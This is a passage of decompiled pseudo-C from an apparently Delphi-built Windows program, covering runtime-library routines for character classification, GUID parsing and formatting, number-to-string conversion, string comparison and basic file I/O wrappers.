  dword_46C664 = (int)dword_46C654 + dword_46C654[3];
  dword_46C668 = (int)dword_46C654 + dword_46C654[4];
  dword_46C66C = (int)dword_46C654 + dword_46C654[5];
  result = (int)dword_46C654 + dword_46C654[6];
  dword_46C670 = result;
  return result;
}
// 46C654: using guessed type _DWORD *dword_46C654;
// 46C658: using guessed type int dword_46C658;
// 46C65C: using guessed type int dword_46C65C;
// 46C660: using guessed type int dword_46C660;
// 46C664: using guessed type int dword_46C664;
// 46C668: using guessed type int dword_46C668;
// 46C66C: using guessed type int dword_46C66C;
// 46C670: using guessed type int dword_46C670;

//----- (00411B84) --------------------------------------------------------
char __fastcall sub_411B84(unsigned int a1)
{
  if ( a1 <= 0x10FFFF )
    return *(_BYTE *)(dword_46C660
                    + (a1 & 0xF)
                    + *(unsigned __int16 *)(dword_46C65C
                                          + 2
                                          * (((unsigned __int8)a1 >> 4)
                                           + 16 * *(unsigned __int8 *)(dword_46C658 + (a1 >> 8)))));
  else
    return 2;
}
// 46C658: using guessed type int dword_46C658;
// 46C65C: using guessed type int dword_46C65C;
// 46C660: using guessed type int dword_46C660;

//----- (00411BC4) --------------------------------------------------------
bool __fastcall sub_411BC4(unsigned __int16 *a1)
{
  unsigned int v1; // ebx
  unsigned int v2; // ebx

  v1 = *a1;
  if ( v1 > 0x7F )
  {
    if ( v1 > 0xFF )
      return (unsigned __int8)(sub_411B84(v1) - 5) < 5u;
    else
      return (unsigned __int8)(*(_BYTE *)(dword_46C660 + v1) - 5) < 5u;
  }
  else
  {
    v2 = v1 | 0x20;
    return v2 >= 0x61 && v2 <= 0x7A;
  }
}
// 46C660: using guessed type int dword_46C660;

//----- (00411C18) --------------------------------------------------------
bool __fastcall sub_411C18(unsigned __int16 *a1)
{
  unsigned int v1; // esi

  v1 = *a1;
  if ( v1 <= 0x7F )
    return v1 - 48 < 0xA;
  if ( v1 > 0xFF )
    return (unsigned __int8)(sub_411B84(v1) - 13) < 3u;
  return (unsigned __int8)(*(_BYTE *)(dword_46C660 + v1) - 13) < 3u;
}
// 46C660: using guessed type int dword_46C660;

//----- (00411C68) --------------------------------------------------------
void sub_411C68()
{
  ++dword_46C650;
}
// 46C650: using guessed type int dword_46C650;

//----- (00411EAC) --------------------------------------------------------
int __fastcall sub_411EAC(int a1, int a2)
{
  int result; // eax
  unsigned int v3[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v3[2] = (unsigned int)&savedregs;
  v3[1] = (unsigned int)&loc_411EDD;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  if ( !++dword_46C674 )
    sub_406818(&dword_411C70, a2);
  result = 0;
  __writefsdword(0, v3[0]);
  return result;
}
// 411C70: using guessed type int dword_411C70;
// 46C674: using guessed type int dword_46C674;

//----- (004147F8) --------------------------------------------------------
_DWORD *sub_4147F8()
{
  _DWORD *result; // eax

  if ( !++dword_46C78C )
    return sub_406C44(&dword_46C77C);
  return result;
}
// 46C77C: using guessed type _DWORD dword_46C77C;
// 46C78C: using guessed type int dword_46C78C;

//----- (00414828) --------------------------------------------------------
int __usercall sub_414828@<eax>(int a1@<eax>, int a2@<ebp>, int a3@<edi>, int a4@<esi>)
{
  int v5; // eax

  v5 = Sysutils::Exception::Exception((int)off_4131CC, 1, a1);
  return sub_406340(v5, a1, a2, a3, a4);
}
// 4131CC: using guessed type int (*off_4131CC[2])();

//----- (00414840) --------------------------------------------------------
int __usercall sub_414840@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebp>)
{
  int v5; // esi
  int v7; // eax
  int v9; // [esp-4h] [ebp-10h]

  v5 = a2;
  v9 = a2;
  LOBYTE(a2) = 1;
  v7 = Sysutils::Exception::Exception((int)off_4131CC, a2, a1, v9, a3);
  return sub_406340(v7, a1, a4, a3, v5);
}
// 4131CC: using guessed type int (*off_4131CC[2])();

//----- (00414864) --------------------------------------------------------
int __cdecl sub_414864(int a1)
{
  int v2; // [esp+0h] [ebp-8h] BYREF
  char v3; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v2 = *(_DWORD *)(a1 - 4);
  v3 = 17;
  return sub_414840((int)off_468138, (int)&v2, 0, (int)&savedregs);
}
// 468138: using guessed type int **off_468138;

//----- (0041488C) --------------------------------------------------------
char __usercall sub_41488C@<al>(__int16 a1@<ax>, int a2)
{
  if ( (unsigned __int16)(a1 - 48) < 0xAu )
    return a1 - 48;
  if ( (unsigned __int16)(a1 - 65) < 6u )
    return a1 - 65 + 10;
  if ( (unsigned __int16)(a1 - 97) < 6u )
    return a1 - 97 + 10;
  sub_414864(a2);
  return 0;
}

//----- (004148CC) --------------------------------------------------------
char __usercall sub_4148CC@<al>(__int16 *a1@<eax>, int a2)
{
  char v4; // [esp-4h] [ebp-8h]

  v4 = 16 * sub_41488C(*a1, a2);
  return sub_41488C(a1[1], a2) + v4;
}

//----- (004148FC) --------------------------------------------------------
char __fastcall sub_4148FC(_WORD *a1, int a2)
{
  int v4; // edi
  int v5; // ebx
  int i; // esi
  _WORD *v7; // ebx
  char *v8; // edi
  __int16 *v9; // ebx
  int v10; // esi
  char *v11; // edi
  _WORD *v12; // ebx
  char *v13; // edi
  __int16 *v14; // ebx
  char *v15; // edi
  _WORD *v16; // ebx
  __int16 *v17; // ebx
  int v18; // esi
  char result; // al
  _WORD *v20; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v20 = a1;
  if ( a1 )
    a1 = (_WORD *)*((_DWORD *)a1 - 1);
  if ( a1 != (_WORD *)38 || *v20 != 123 )
    sub_414864((int)&savedregs);
  v4 = a2;
  v5 = sub_407790((int)v20) + 2;
  for ( i = 0; i != 4; ++i )
    *(_BYTE *)(v4 + i) = sub_4148CC((__int16 *)(v5 + 4 * (3 - i)), (int)&savedregs);
  v7 = (_WORD *)(v5 + 16);
  v8 = (char *)(v4 + 4);
  if ( *v7 != 45 )
    sub_414864((int)&savedregs);
  v9 = v7 + 1;
  v10 = 2;
  do
  {
    *v8 = sub_4148CC(v9 + 2, (int)&savedregs);
    v11 = v8 + 1;
    *v11 = sub_4148CC(v9, (int)&savedregs);
    v8 = v11 + 1;
    v12 = v9 + 4;
    if ( *v12 != 45 )
      sub_414864((int)&savedregs);
    v9 = v12 + 1;
    --v10;
  }
  while ( v10 );
  *v8 = sub_4148CC(v9, (int)&savedregs);
  v13 = v8 + 1;
  v14 = v9 + 2;
  *v13 = sub_4148CC(v14, (int)&savedregs);
  v15 = v13 + 1;
  v16 = v14 + 2;
  if ( *v16 != 45 )
    sub_414864((int)&savedregs);
  v17 = v16 + 1;
  v18 = 6;
  do
  {
    result = sub_4148CC(v17, (int)&savedregs);
    *v15++ = result;
    v17 += 2;
    --v18;
  }
  while ( v18 );
  return result;
}

//----- (004149F8) --------------------------------------------------------
_WORD *__fastcall sub_4149F8(int a1, int *a2, int a3)
{
  _WORD *v5; // eax
  int v7; // [esp+0h] [ebp-60h] BYREF
  char v8; // [esp+4h] [ebp-5Ch]
  int v9; // [esp+8h] [ebp-58h]
  char v10; // [esp+Ch] [ebp-54h]
  int v11; // [esp+10h] [ebp-50h]
  char v12; // [esp+14h] [ebp-4Ch]
  int v13; // [esp+18h] [ebp-48h]
  char v14; // [esp+1Ch] [ebp-44h]
  int v15; // [esp+20h] [ebp-40h]
  char v16; // [esp+24h] [ebp-3Ch]
  int v17; // [esp+28h] [ebp-38h]
  char v18; // [esp+2Ch] [ebp-34h]
  int v19; // [esp+30h] [ebp-30h]
  char v20; // [esp+34h] [ebp-2Ch]
  int v21; // [esp+38h] [ebp-28h]
  char v22; // [esp+3Ch] [ebp-24h]
  int v23; // [esp+40h] [ebp-20h]
  char v24; // [esp+44h] [ebp-1Ch]
  int v25; // [esp+48h] [ebp-18h]
  char v26; // [esp+4Ch] [ebp-14h]
  int v27; // [esp+50h] [ebp-10h]
  char v28; // [esp+54h] [ebp-Ch]

  sub_407890(a2, 38, a3);
  v7 = *(_DWORD *)a1;
  v8 = 0;
  v9 = *(unsigned __int16 *)(a1 + 4);
  v10 = 0;
  v11 = *(unsigned __int16 *)(a1 + 6);
  v12 = 0;
  v13 = *(unsigned __int8 *)(a1 + 8);
  v14 = 0;
  v15 = *(unsigned __int8 *)(a1 + 9);
  v16 = 0;
  v17 = *(unsigned __int8 *)(a1 + 10);
  v18 = 0;
  v19 = *(unsigned __int8 *)(a1 + 11);
  v20 = 0;
  v21 = *(unsigned __int8 *)(a1 + 12);
  v22 = 0;
  v23 = *(unsigned __int8 *)(a1 + 13);
  v24 = 0;
  v25 = *(unsigned __int8 *)(a1 + 14);
  v26 = 0;
  v27 = *(unsigned __int8 *)(a1 + 15);
  v28 = 0;
  v5 = (_WORD *)sub_407790(*a2);
  return sub_415B68(v5, 0x26u, (unsigned int)L"{%.8x-%.4x-%.4x-%.2x%.2x-%.2x%.2x%.2x%.2x%.2x%.2x}", (int)&v7, 10);
}
// 414AB8: using guessed type wchar_t a8x4x4x2x2x2x2x[51];

//----- (00414B20) --------------------------------------------------------
unsigned __int8 __fastcall sub_414B20(unsigned __int8 a1, const signed __int32 *a2)
{
  return _bittest(a2, a1);
}

//----- (00414B2C) --------------------------------------------------------
unsigned __int8 __fastcall sub_414B2C(unsigned __int16 a1, const signed __int32 *a2)
{
  bool v2; // cf

  v2 = a1 < 0xFFu;
  if ( a1 <= 0xFFu )
    return _bittest(a2, a1);
  return v2;
}

//----- (00414B3C) --------------------------------------------------------
unsigned __int16 __fastcall sub_414B3C(int a1, unsigned __int16 **a2, int a3)
{
  unsigned __int16 *v4; // ebx
  int v5; // esi
  unsigned __int16 result; // ax
  unsigned __int16 *v7; // ecx
  int v8; // edx

  v4 = (unsigned __int16 *)a1;
  if ( a1 )
    a1 = *(_DWORD *)(a1 - 4);
  v5 = a1;
  result = (unsigned __int16)sub_407890(a2, a1, a3);
  if ( v5 > 0 )
  {
    v7 = *a2;
    v8 = v5;
    do
    {
      result = *v4;
      if ( (unsigned __int16)(*v4 - 97) < 0x1Au )
        result ^= 0x20u;
      *v7++ = result;
      ++v4;
      --v8;
    }
    while ( v8 );
  }
  return result;
}
// 414B64: conditional instruction was optimized away because esi.4>=1

//----- (00414B8C) --------------------------------------------------------
unsigned __int16 __fastcall sub_414B8C(int a1, unsigned __int16 **a2, int a3)
{
  unsigned __int16 *v4; // ebx
  int v5; // esi
  unsigned __int16 result; // ax
  unsigned __int16 *v7; // ecx
  int v8; // edx

  v4 = (unsigned __int16 *)a1;
  if ( a1 )
    a1 = *(_DWORD *)(a1 - 4);
  v5 = a1;
  result = (unsigned __int16)sub_407890(a2, a1, a3);
  if ( v5 > 0 )
  {
    v7 = *a2;
    v8 = v5;
    do
    {
      result = *v4;
      if ( (unsigned __int16)(*v4 - 65) < 0x1Au )
        result |= 0x20u;
      *v7++ = result;
      ++v4;
      --v8;
    }
    while ( v8 );
  }
  return result;
}
// 414BB4: conditional instruction was optimized away because esi.4>=1

//----- (00414CB4) --------------------------------------------------------
volatile __int32 *__fastcall sub_414CB4(int a1, volatile __int32 *a2)
{
  int v3; // esi
  int v4; // ebx
  int vars0[5]; // [esp+0h] [ebp+0h] BYREF

  vars0[0] = a1;
  v3 = sub_41C314(vars0) - 1;
  v4 = 0;
  if ( v3 > -1 && (unsigned __int16)sub_41C548(vars0, 0) > 0x20u && (unsigned __int16)sub_41C548(vars0, v3) > 0x20u )
    return sub_406FE8(a2, vars0[0]);
  while ( v3 >= v4 && (unsigned __int16)sub_41C548(vars0, v4) <= 0x20u )
    ++v4;
  if ( v3 < v4 )
    return sub_406C44(a2);
  while ( (unsigned __int16)sub_41C548(vars0, v3) <= 0x20u )
    --v3;
  return sub_41C5E4(vars0, v4, v3 - v4 + 1, a2);
}

//----- (00414D44) --------------------------------------------------------
int __fastcall sub_414D44(unsigned int a1, unsigned __int8 a2, int *a3)
{
  unsigned int v5; // edi
  int v6; // esi
  _WORD *v7; // ecx
  int result; // eax
  int *i; // ecx
  unsigned int v10; // eax

  v5 = a1;
  if ( a1 < 0x2710 )
  {
    if ( a1 < 0x64 )
      v6 = (a1 >= 0xA) + 1;
    else
      v6 = (a1 >= 0x3E8) + 3;
  }
  else if ( a1 < 0xF4240 )
  {
    v6 = (a1 >= 0x186A0) + 5;
  }
  else if ( a1 < 0x5F5E100 )
  {
    v6 = (a1 >= 0x989680) + 7;
  }
  else
  {
    v6 = (a1 >= 0x3B9ACA00) + 9;
  }
  sub_407890(a3, v6 + a2, (int)a3);
  v7 = (_WORD *)sub_407790(*a3);
  *v7 = 45;
  result = 2 * a2;
  for ( i = (int *)((char *)v7 + result); v6 > 2; *(int *)((char *)i + 2 * v6) = result )
  {
    v10 = v5 % 0x64;
    v5 /= 0x64u;
    v6 -= 2;
    result = dword_465E48[v10];
  }
  if ( v6 == 2 )
  {
    result = dword_465E48[v5];
    *i = result;
  }
  else
  {
    *(_WORD *)i = v5 | 0x30;
  }
  return result;
}
// 465E48: using guessed type int dword_465E48[];

//----- (00414E40) --------------------------------------------------------
int __fastcall sub_414E40(unsigned __int8 a1, int *a2, int a3, unsigned __int64 a4)
{
  bool v5; // cc
  int result; // eax
  unsigned __int8 v7; // bl
  _WORD *v8; // eax
  _WORD *v9; // esi
  int v10; // eax
  unsigned __int8 v11; // bl
  unsigned int i; // ecx
  unsigned int v13; // eax
  unsigned int v14; // [esp+14h] [ebp-24h]
  unsigned int v15; // [esp+20h] [ebp-18h]
  unsigned __int64 v16; // [esp+28h] [ebp-10h]

  if ( a1 && a4 <= 0x7FFFFFFF )
    return sub_414D44(a4, a1, a2);
  if ( !a1 )
  {
    v5 = HIDWORD(a4) == 0;
    if ( !HIDWORD(a4) )
      v5 = 1;
    if ( v5 )
      return sub_414D44(a4, a1, a2);
  }
  v16 = a4;
  if ( a4 < 0x5AF3107A4000i64 )
  {
    if ( a4 < 0xE8D4A51000i64 )
    {
      if ( a4 < 0x2540BE400i64 )
        v7 = 10;
      else
        v7 = (a4 >= 0x174876E800i64) + 11;
    }
    else
    {
      v7 = (a4 >= 0x9184E72A000i64) + 13;
    }
  }
  else if ( a4 < 0x2386F26FC10000i64 )
  {
    v7 = (a4 >= 0x38D7EA4C68000i64) + 15;
  }
  else if ( a4 < 0xDE0B6B3A7640000i64 )
  {
    v7 = (a4 >= 0x16345785D8A0000i64) + 17;
  }
  else if ( a4 < 0x8AC7230489E80000i64 )
  {
    v7 = 19;
  }
  else
  {
    v7 = 20;
  }
  sub_407890(a2, a1 + v7, a3);
  v8 = (_WORD *)sub_407790(*a2);
  *v8 = 45;
  v9 = &v8[a1];
  if ( v7 == 20 )
  {
    *v9++ = 49;
    v16 = a4 + 0x7538DCFB76180000i64;
    v7 = 19;
  }
  if ( v7 > 0x11u )
  {
    if ( v7 == 19 )
    {
      *v9 = 48;
      while ( v16 >= 0xDE0B6B3A7640000i64 )
      {
        v16 -= 1000000000000000000i64;
        ++*v9;
      }
      ++v9;
    }
    *v9 = 48;
    while ( v16 >= 0x16345785D8A0000i64 )
    {
      v16 -= 100000000000000000i64;
      ++*v9;
    }
    ++v9;
    v7 = 17;
  }
  v15 = System::__linkproc__ _lludiv(100000000, 0);
  v10 = unknown_libname_57(100000000, 0);
  v14 = ((int)v16 - v10) / 0x64u;
  *(_DWORD *)&v9[v7 - 2] = dword_465E48[((int)v16 - v10) % 0x64u];
  *(_DWORD *)&v9[v7 - 4] = dword_465E48[v14 % 0x64];
  *(_DWORD *)&v9[v7 - 6] = dword_465E48[v14 / 0x64 % 0x64];
  result = dword_465E48[v14 / 0x64 / 0x64];
  *(_DWORD *)&v9[v7 - 8] = result;
  v11 = v7 - 8;
  for ( i = v15; v11 > 2u; *(_DWORD *)&v9[v11] = result )
  {
    v13 = i % 0x64;
    i /= 0x64u;
    v11 -= 2;
    result = dword_465E48[v13];
  }
  if ( v11 == 2 )
  {
    result = dword_465E48[i];
    *(_DWORD *)v9 = result;
  }
  else
  {
    *v9 = i | 0x30;
  }
  return result;
}
// 40856C: using guessed type __int64 __stdcall unknown_libname_57(_DWORD, _DWORD);
// 408624: using guessed type __int64 __stdcall System::__linkproc__ _lludiv(_DWORD, _DWORD);
// 465E48: using guessed type int dword_465E48[];

//----- (00415150) --------------------------------------------------------
int __fastcall sub_415150(signed int a1, int *a2)
{
  if ( a1 >= 0 )
    return sub_414D44(a1, 0, a2);
  else
    return sub_414D44(-a1, 1u, a2);
}

//----- (00415178) --------------------------------------------------------
int __fastcall sub_415178(int *a1, int a2, int a3, signed __int64 a4)
{
  if ( a4 >= 0 )
    return sub_414E40(0, a1, a3, a4);
  else
    return sub_414E40(1u, a1, a3, -a4);
}

//----- (004151EC) --------------------------------------------------------
_DWORD *__fastcall sub_4151EC(unsigned int a1, int a2, int a3, __int16 a4, int *a5)
{
  int v5; // ebx
  int v7; // eax
  int v8; // edx
  int v9; // edx
  _DWORD *i; // eax
  void *v11; // ebx
  unsigned int v13[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v14; // [esp-4h] [ebp-18h]
  int v15; // [esp+Ch] [ebp-8h]
  void *v16; // [esp+10h] [ebp-4h] BYREF
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v16 = 0;
  v5 = a3;
  v15 = a2;
  v14 = &savedregs;
  v13[1] = (unsigned int)&loc_4152E1;
  v13[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  if ( a3 >= a2 )
  {
    System::__linkproc__ DynArraySetLength(a3);
    v9 = 0;
  }
  else
  {
    System::__linkproc__ DynArraySetLength(v15);
    if ( v15 - v5 - 1 >= 0 )
    {
      v7 = v15 - v5;
      v8 = 0;
      do
      {
        *((_WORD *)v16 + v8++) = a4;
        --v7;
      }
      while ( v7 );
    }
    v9 = v15 - v5;
  }
  for ( i = (char *)v16 + 2 * v5 + 2 * v9; v5 >= 2; a1 >>= 8 )
  {
    v5 -= 2;
    *--i = dword_465FD8[(unsigned __int8)a1];
  }
  if ( v5 == 1 )
    *((_WORD *)v16 + v9) = word_4663D8[a1 & 0xF];
  v11 = v16;
  if ( v16 )
    v11 = (void *)*((_DWORD *)v16 - 1);
  sub_41C518(v16, (int)v11 - 1, a5);
  __writefsdword(0, v13[0]);
  v14 = (int *)&loc_4152E8;
  return sub_408B34(&v16, (int)dword_402B7C);
}
// 402B7C: using guessed type int dword_402B7C[7];
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);
// 465FD8: using guessed type int dword_465FD8[];
// 4663D8: using guessed type __int16 word_4663D8[16];

//----- (004152F4) --------------------------------------------------------
_DWORD *__fastcall sub_4152F4(int a1, int a2, __int16 a3, unsigned __int64 a4, int *a5)
{
  int v5; // ebx
  int v7; // eax
  int v8; // edx
  int v9; // esi
  _DWORD *i; // ecx
  void *v11; // ebx
  unsigned int v13[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v14; // [esp-4h] [ebp-18h]
  __int16 v15; // [esp+Eh] [ebp-6h]
  void *v16; // [esp+10h] [ebp-4h] BYREF
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v16 = 0;
  v15 = a3;
  v5 = a2;
  v14 = &savedregs;
  v13[1] = (unsigned int)&loc_415404;
  v13[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  if ( a2 >= a1 )
  {
    System::__linkproc__ DynArraySetLength(a2);
    v9 = 0;
  }
  else
  {
    System::__linkproc__ DynArraySetLength(a1);
    if ( a1 - v5 - 1 >= 0 )
    {
      v7 = a1 - v5;
      v8 = 0;
      do
      {
        *((_WORD *)v16 + v8++) = v15;
        --v7;
      }
      while ( v7 );
    }
    v9 = a1 - v5;
  }
  for ( i = (char *)v16 + 2 * v5 + 2 * v9; v5 >= 2; a4 >>= 8 )
  {
    v5 -= 2;
    *--i = dword_465FD8[(unsigned __int8)a4];
  }
  if ( v5 == 1 )
    *((_WORD *)v16 + v9) = word_4663D8[a4 & 0xF];
  v11 = v16;
  if ( v16 )
    v11 = (void *)*((_DWORD *)v16 - 1);
  sub_41C518(v16, (int)v11 - 1, a5);
  __writefsdword(0, v13[0]);
  v14 = (int *)&loc_41540B;
  return sub_408B34(&v16, (int)dword_402B7C);
}
// 402B7C: using guessed type int dword_402B7C[7];
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);
// 465FD8: using guessed type int dword_465FD8[];
// 4663D8: using guessed type __int16 word_4663D8[16];

//----- (00415414) --------------------------------------------------------
_DWORD *__fastcall sub_415414(unsigned int a1, int a2, int *a3)
{
  int v4; // ebx
  unsigned int i; // eax

  v4 = 1;
  for ( i = a1 >> 4; i; i >>= 4 )
    ++v4;
  return sub_4151EC(a1, a2, v4, 48, a3);
}

//----- (0041544C) --------------------------------------------------------
_DWORD *__fastcall sub_41544C(int a1, int *a2, unsigned __int64 a3)
{
  int v4; // ebx
  unsigned __int64 i; // [esp+Ch] [ebp-8h]

  v4 = 1;
  for ( i = a3 >> 4; i; i >>= 4 )
    ++v4;
  return sub_4152F4(a1, v4, 48, a3, a2);
}

//----- (004154B0) --------------------------------------------------------
_DWORD *__fastcall sub_4154B0(unsigned int a1, int a2, int *a3)
{
  return sub_415414(a1, a2, a3);
}

//----- (004154C8) --------------------------------------------------------
_DWORD *__fastcall sub_4154C8(int a1, int *a2, unsigned __int64 a3)
{
  return sub_41544C(a1, a2, a3);
}

//----- (00415520) --------------------------------------------------------
volatile __int32 *sub_415520()
{
  int v0; // eax
  volatile __int32 *result; // eax

  v0 = dword_46C764;
  if ( dword_46C764 )
    v0 = *(_DWORD *)(dword_46C764 - 4);
  if ( !v0 )
  {
    System::__linkproc__ DynArraySetLength(1);
    sub_406FE8((volatile __int32 *)dword_46C764, (int)L"True");
  }
  result = (volatile __int32 *)dword_46C768;
  if ( dword_46C768 )
    result = *(volatile __int32 **)(dword_46C768 - 4);
  if ( !result )
  {
    System::__linkproc__ DynArraySetLength(1);
    return sub_406FE8((volatile __int32 *)dword_46C768, (int)L"False");
  }
  return result;
}
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);
// 4155A4: using guessed type wchar_t aTrue[5];
// 4155BC: using guessed type wchar_t aFalse[6];
// 46C764: using guessed type int dword_46C764;
// 46C768: using guessed type int dword_46C768;

//----- (004155C8) --------------------------------------------------------
int __usercall sub_4155C8@<eax>(int *a1@<eax>, int a2@<edx>, int a3)
{
  int v3; // esi
  unsigned __int8 v6; // [esp+1Bh] [ebp-1h]

  v6 = 0;
  if ( a2 >= 0 )
  {
    v3 = a2 + 1;
    while ( Sysutils::AnsiCompareText(*(_DWORD *)(a3 - 4), *a1) )
    {
      ++a1;
      if ( !--v3 )
        return v6;
    }
    return 1;
  }
  return v6;
}

//----- (00415618) --------------------------------------------------------
int __fastcall sub_415618(int a1, bool *a2)
{
  int v3; // edx
  int v4; // eax
  int v5; // eax
  long double v7; // [esp+4h] [ebp-10h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v3 = sub_4174A0();
  if ( (_BYTE)v3 )
  {
    *a2 = v7 != 0.0;
  }
  else
  {
    sub_415520();
    v4 = dword_46C764;
    if ( dword_46C764 )
      v4 = *(_DWORD *)(dword_46C764 - 4);
    v3 = sub_4155C8((int *)dword_46C764, v4 - 1, (int)&savedregs);
    if ( (_BYTE)v3 )
    {
      *a2 = 1;
    }
    else
    {
      v5 = dword_46C768;
      if ( dword_46C768 )
        v5 = *(_DWORD *)(dword_46C768 - 4);
      v3 = sub_4155C8((int *)dword_46C768, v5 - 1, (int)&savedregs);
      if ( (_BYTE)v3 )
        *a2 = 0;
    }
  }
  return v3;
}
// 415640: variable 'v7' is possibly undefined
// 46C764: using guessed type int dword_46C764;
// 46C768: using guessed type int dword_46C768;

//----- (00415710) --------------------------------------------------------
int __fastcall sub_415710(int a1, char a2)
{
  int result; // eax
  const WCHAR *v4; // eax
  DWORD v5; // [esp-18h] [ebp-24h]
  DWORD v6; // [esp-14h] [ebp-20h]

  result = -1;
  if ( (a2 & 3) != 3 && (a2 & 0xF0u) <= 0x40 )
  {
    v6 = dwShareMode[(unsigned __int8)(a2 & 0xF0) >> 4];
    v5 = dwDesiredAccess[a2 & 3];
    v4 = (const WCHAR *)sub_407790(a1);
    return (int)CreateFileW(v4, v5, v6, 0, 3u, 0x80u, 0);
  }
  return result;
}
// 466400: using guessed type DWORD dwDesiredAccess[3];
// 46640C: using guessed type DWORD dwShareMode[5];

//----- (00415794) --------------------------------------------------------
DWORD __fastcall sub_415794(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite)
{
  DWORD NumberOfBytesWritten; // [esp+0h] [ebp-10h] BYREF

  NumberOfBytesWritten = nNumberOfBytesToWrite;
  if ( !WriteFile_1(hFile, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0) )
    return -1;
  return NumberOfBytesWritten;
}

//----- (0041581C) --------------------------------------------------------
BOOL __fastcall sub_41581C(HANDLE hObject)
{
  return CloseHandle_0(hObject);
}

//----- (00415824) --------------------------------------------------------
_DWORD *__fastcall sub_415824(int a1, _DWORD *a2)
{
  int v3; // eax
  int v5[3]; // [esp+0h] [ebp-Ch] BYREF

  v5[0] = a1;
  v3 = sub_41C550(v5, (int)L"\\:");
  return sub_41C5B4(v5, v3 + 1, a2);
}
// 415858: using guessed type wchar_t asc_415858[3];

//----- (004158D4) --------------------------------------------------------
_WORD *__fastcall sub_4158D4(_WORD *result)
{
  _WORD *v1; // eax

  if ( *result )
  {
    v1 = result + 1;
    while ( *v1++ )
      ;
    return v1 - 1;
  }
  return result;
}

//----- (00415900) --------------------------------------------------------
void *__fastcall sub_415900(void *a1, void *a2, unsigned int a3)
{
  unsigned int v6; // ebx

  v6 = sub_407124((int)a2);
  if ( a3 < v6 )
    v6 = a3;
  System::Move(a2, a1, 2 * v6);
  *((_WORD *)a1 + v6) = 0;
  return a1;
}

//----- (0041593C) --------------------------------------------------------
int __fastcall sub_41593C(unsigned __int16 *a1, _WORD *a2, unsigned int a3)
{
  int v3; // edi
  unsigned __int16 v4; // si

  v3 = 0;
  if ( !a3 )
    return 0;
  while ( 1 )
  {
    v4 = *a1;
    if ( *a2 != *a1 || !v4 )
      break;
    ++a1;
    ++a2;
    if ( ++v3 >= a3 )
      return 0;
  }
  return v4 - (unsigned __int16)*a2;
}

//----- (00415978) --------------------------------------------------------
int __fastcall sub_415978(_WORD *a1, _WORD *a2, unsigned int a3)
{
  int v5; // edx
  unsigned __int16 v6; // ax
  unsigned __int16 v7; // bp

  v5 = 0;
  if ( !a3 )
    return 0;
  while ( 1 )
  {
    v6 = (unsigned __int16)(*a1 - 97) >= 0x1Au ? *a1 : *a1 ^ 0x20;
    v7 = (unsigned __int16)(*a2 - 97) >= 0x1Au ? *a2 : *a2 ^ 0x20;
    if ( v7 != v6 || !v6 )
      break;
    ++a1;
    ++a2;
    if ( ++v5 >= a3 )
      return 0;
  }
  return v6 - v7;
}

//----- (004159E4) --------------------------------------------------------
_WORD *__fastcall sub_4159E4(_WORD *a1, __int16 a2)
{
  _WORD *v2; // esi

  if ( !a2 )
    return sub_4158D4(a1);
  v2 = 0;
  while ( 1 )
  {
    while ( a2 == *a1 )
      v2 = a1++;
    if ( !*a1 )
      break;
    ++a1;
  }
  return v2;
}

//----- (00415A14) --------------------------------------------------------
_WORD *__fastcall sub_415A14(_WORD *a1, _WORD *a2)
{
  _WORD *v2; // edi
  int v3; // ecx
  int v4; // ecx
  unsigned int v5; // esi
  _WORD *v6; // edi
  int v7; // ecx
  unsigned int v8; // ecx
  bool v9; // zf
  bool v10; // cc
  unsigned int v11; // ecx
  _WORD *v12; // edi
  unsigned int v13; // ebx
  _WORD *v14; // esi
  unsigned int v15; // eax
  unsigned int v16; // ecx
  _WORD *v18; // [esp-4h] [ebp-10h]

  if ( a1 && a2 )
  {
    v2 = a2;
    v3 = -1;
    do
    {
      if ( !v3 )
        break;
      v9 = *v2++ == 0;
      --v3;
    }
    while ( !v9 );
    v4 = -v3 - 2;
    if ( v4 )
    {
      v5 = v4;
      v6 = a1;
      v7 = -1;
      do
      {
        if ( !v7 )
          break;
        v9 = *v6++ == 0;
        --v7;
      }
      while ( !v9 );
      v8 = ~v7;
      v9 = v8 == v5;
      v10 = v8 <= v5;
      v11 = v8 - v5;
      if ( !v10 )
      {
        v12 = a1;
        v13 = v5 - 1;
        while ( 1 )
        {
          v14 = a2 + 1;
          do
          {
            if ( !v11 )
              break;
            v9 = *v12++ == *a2;
            --v11;
          }
          while ( !v9 );
          if ( !v9 )
            break;
          v15 = v11;
          v18 = v12;
          v16 = v13;
          do
          {
            if ( !v16 )
              break;
            v9 = *v14++ == *v12++;
            --v16;
          }
          while ( v9 );
          v12 = v18;
          v11 = v15;
          if ( v9 )
            return v18 - 1;
        }
      }
    }
  }
  return 0;
}

//----- (00415A6C) --------------------------------------------------------
int __fastcall sub_415A6C(int a1, _WORD *a2, int a3, unsigned int a4)
{
  int v5; // edi
  int i; // ebx
  int v8; // [esp+Ch] [ebp-8h]

  v8 = 0;
  if ( a3 && a4 && (int)(a3 - a4) >= 0 )
  {
    v5 = a3 - a4 + 1;
    for ( i = 0; !*(_WORD *)(a1 + 2 * i) || sub_41593C((unsigned __int16 *)(a1 + 2 * i), a2, a4); ++i )
    {
      if ( !--v5 )
        return v8;
    }
    return a1 + 2 * i;
  }
  return v8;
}

//----- (00415ACC) --------------------------------------------------------
int __usercall sub_415ACC@<eax>(int a1@<eax>, int a2@<edx>, unsigned int a3@<ecx>, int a4@<ebp>)
